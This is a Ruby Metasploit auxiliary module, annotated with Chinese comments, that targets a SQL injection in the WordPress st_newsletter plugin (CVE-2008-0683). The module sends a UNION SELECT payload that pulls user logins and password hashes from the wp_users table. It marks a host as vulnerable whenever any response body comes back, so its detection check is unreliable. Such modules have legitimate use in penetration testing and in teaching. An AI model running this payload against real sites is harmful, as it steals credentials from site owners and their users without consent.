#引入库
require 'msf/core' #每个msf module必须引入此库
require 'uri'       
#继承的类
class MetasploitModule < Msf::Auxiliary 

#引入的module
  include Msf::Exploit::Remote::HTTP::Wordpress  
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report


  def initialize(info = {})
#利用模块的基本信息(名称，描述)
    super(update_info(info,
      'Name'        => 'WordPress Contus st_newsletter SQL Injection Scanner',
      'Description' => %q{ 
      This module attempts to exploit a UNION-based SQL injection in WordPress Plugin st_newsletter
      },
      'Author'       =>
        [
          'S@BUN', #漏洞发现人
        ],
#必须填写此许可
      'License'     => MSF_LICENSE,
#漏洞数据库的编号
      'References'  =>
        [
          [ 'CVE', '2008-0683'],
          [ 'EDB', '5053' ]
         
        ],
#漏洞公布时间
      'DisclosureDate' => 'Mar 03 2015'))
#根据测试目录设置目标url
    register_options([
      OptString.new('TARGETURI', [true, 'Target URI', '/'])
    ], self.class)
  end

  def run_host(ip)
    vprint_status("Checking host")

#发送请求
    res = send_request_cgi({
      'uri'       => normalize_uri(target_uri.path, '/'),
      'vars_get' => {
        'newsletter' => "-1 UNION ALL SELECT CONCAT(0x7c,user_login,0x7c,user_pass,0x7c) FROM wp_users"
      }
    })
    unless res && res.body
      vprint_error("Server did not respond in an expected way")
      return
    end
#输出
      print_good("Vulnerable to SQL injection within WordPress Plugin st_newsletter")
      report_vuln({
        :host  => rhost,
        :port  => rport,
        :proto => 'tcp',
        :name  => "SQL injection in WordPress Plugin st_newsletter",
        :refs  => self.references.select { |ref| ref.ctx_val == "2008-0683" }
      })
   end
end